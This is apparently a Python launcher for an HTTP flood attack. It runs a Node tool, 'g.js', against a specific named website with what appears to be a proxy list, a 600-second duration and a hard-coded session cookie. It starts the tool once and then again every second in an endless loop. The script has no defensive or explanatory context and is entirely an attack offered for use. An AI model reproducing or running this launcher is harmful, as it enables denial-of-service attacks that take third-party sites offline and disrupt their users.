import schedule
import time
import os
import sys

os.system('node g.js https://sait-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:qnjlrolglumjjh646bsusfc4s9')

def job():
    os.system('node g.js https://sait-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:qnjlrolglumjjh646bsusfc4s9')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)